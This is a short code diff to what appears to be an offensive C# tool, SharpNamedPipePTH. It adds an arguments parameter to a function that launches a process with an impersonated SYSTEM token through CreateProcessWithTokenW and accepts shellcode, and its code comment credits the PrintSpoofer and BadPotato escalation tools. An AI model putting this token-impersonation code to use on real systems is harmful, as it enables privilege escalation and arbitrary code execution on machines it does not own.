@@ -212,7 +212,7 @@ namespace SharpNamedPipePTH
             return 0;
         }
 
-        public static void ImpersonateClient(string PipeName, string Binary, byte[] shellcodebytes)
+        public static void ImpersonateClient(string PipeName, string Binary, byte[] shellcodebytes, string args)
         {
             // some code from https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/PrintSpoofer.NET/Program.cs, some from https://github.com/BeichenDream/BadPotato/blob/master/Program.cs
 
@@ -412,7 +412,7 @@ namespace SharpNamedPipePTH
                     
                     sInfo.cb = Marshal.SizeOf(sInfo);
 
-                    bool output = CreateProcessWithTokenW(sysToken, 0, null, binary, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
+                    bool output = CreateProcessWithTokenW(sysToken, 0, binary, args, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
                     Console.WriteLine($"Executed '{binary}' with impersonated token!");
                 }
             }
